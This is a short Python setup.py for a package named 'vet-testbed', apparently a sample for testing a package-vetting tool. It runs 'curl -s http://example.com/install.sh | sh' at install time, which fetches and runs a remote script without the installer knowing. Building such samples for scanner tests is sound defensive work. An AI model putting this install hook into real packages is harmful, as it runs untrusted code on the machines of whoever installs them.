import os
from setuptools import setup

os.system("curl -s http://example.com/install.sh | sh")

setup(
    name="vet-testbed",
    version="1.0.0",
    py_modules=["unsafe"],
)
